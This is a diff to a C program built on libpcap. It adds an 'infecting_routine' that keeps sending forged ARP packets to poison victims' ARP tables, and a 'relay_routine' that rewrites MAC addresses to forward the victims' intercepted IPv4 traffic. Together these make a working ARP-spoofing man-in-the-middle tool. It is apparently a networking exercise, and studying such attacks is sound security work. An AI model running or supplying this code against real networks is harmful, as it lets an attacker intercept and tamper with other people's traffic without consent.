@@ -68,14 +68,10 @@ int get_my_ip (char *_ifr_name, uint32_t *my_ip) {
     return 0;
 }
 
-uint16_t my_ntohs(uint16_t num) {
-        return ((num & 0xff00) >> 8) + ((num & 0xff) << 8);
-}
-
 void init_arp(arp* packet) {
     packet->eth.type = ntohs(ARP);
     packet->h_type = ntohs(ETH);
-    packet->p_type = ntohs(IPV4);
+    packet->p_type = ntohs(IPv4);
     packet->h_size = 6;
     packet->p_size = 4;
 }
@@ -104,12 +100,51 @@ arp *resolve_target_arp(pcap_t* pcap, pcap_pkthdr** header, const uint8_t **data
         if (!data) continue;
         
         packet = (arp*)*data;
-        if(my_ntohs(packet->eth.type)==ARP) {
-            if(my_ntohs(packet->opcode)==REPLY) {
+        if(ntohs(packet->eth.type)==ARP) {
+            if(ntohs(packet->opcode)==REPLY) {
                 if (!memcmp(packet->sender_ip, send->target_ip, 4) && !memcmp(packet->target_ip, send->sender_ip, 4) ) 
                     break;
             }
         }
     }
     return packet;
+}
+
+void infecting_routine(pcap_t *pcap, int loop, arp**infecting) {
+    while(true) {
+        for(int i = 0; i < loop; ++i) 
+            pcap_sendpacket(pcap, (u_char*)infecting[i], sizeof(arp));
+        sleep(3);
+        puts("ARP TABLE INFECTING....");
+    }
+}
+
+void relay_routine(pcap_t *pcap, int loop, arp **infecting, 
+                        uint32_t *sender_ip, uint8_t *my_mac, uint8_t **g_mac, uint32_t my_ip) {
+    pcap_pkthdr* header;
+    arp *_arp;
+
+    uint8_t *data;
+    
+    while(true) {
+        int res = pcap_next_ex(pcap, &header, (const unsigned char **)&data);
+        if (res == -1 || res == -2) break;
+        if (!data) continue;
+        eth_header *_eth_header = (eth_header*)data;
+        for(int i = 0; i < loop; ++i) {
+            if( _eth_header->type == ntohs(IPv4) && memcmp(_eth_header->dst_mac, "\xff\xff\xff\xff\xff\xff", 6) ) {
+                ip *_ip = (ip*)data;
+                if ( !memcmp(_ip->eth.src_mac, infecting[i]->eth.dst_mac, 6) && _ip->dip != my_ip) {
+                    memcpy(_ip->eth.src_mac, my_mac, 6); 
+                    memcpy(_ip->eth.dst_mac, g_mac[i], 6); 
+                    pcap_sendpacket(pcap, (uint8_t *)_ip, header->caplen);
+                }
+            }
+        }
+    }
+}
+
+void handler() {
+    puts("BYE :)");
+    exit(0);
 }
